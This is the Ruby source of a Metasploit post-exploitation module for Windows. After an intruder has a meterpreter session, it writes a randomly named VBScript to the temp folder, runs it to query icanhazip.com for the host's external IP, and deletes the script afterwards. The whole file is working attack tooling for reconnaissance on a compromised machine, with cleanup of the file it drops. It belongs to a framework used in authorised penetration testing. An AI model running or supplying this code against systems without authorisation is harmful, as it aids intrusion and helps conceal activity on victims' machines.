##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

class MetasploitModule < Msf::Post

	include Msf::Post::Common
	include Msf::Post::File

	def initialize(info={})
		super( update_info( info,
			'Name'          => 'Windows Gather External IP',
			'Description'   => %q{
				Module to get the external IP address from the command-line.},
			'License'       => MSF_LICENSE,
			'Author'        => [ 'Borja Merino <bmerinofe[at]gmail.com>'],
			'Platform'      => [ 'windows' ],
			'SessionTypes'  => [ 'meterpreter' ],
			'References'    => [
				[ 'URL', 'http://superuser.com/questions/165986/windows-command-that-returns-external-ip' ]
			]
		))
	end


	def run
		vbs_file = create_vbs
		return if vbs_file.nil?

		output = cmd_exec("cscript",vbs_file)
		output.each_line do |l|
			print_good("#{l}") if l =~ /^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$/
		end
		file_rm(vbs_file)
	end


	def create_vbs
		vbs_dir = expand_path("%TEMP%")
		vbs_file = vbs_dir << "\\" << Rex::Text.rand_text_alpha((rand(8)+6)) << ".vbs"

		conf_conn =  "Dim msf\r\n"
		conf_conn += "Set msf = CreateObject(\"MSXML2.XMLHTTP\")\r\n"
		conf_conn += "msf.open \"GET\", \"http://icanhazip.com\", False\r\n"
		conf_conn += "msf.send\r\n"
		conf_conn += "WScript.StdOut.Write msf.responseText\r\n"

		if write_file(vbs_file,conf_conn)
			return vbs_file
		else
			print_error("There were problems creating the vbs file.")
			return nil
		end
	end
end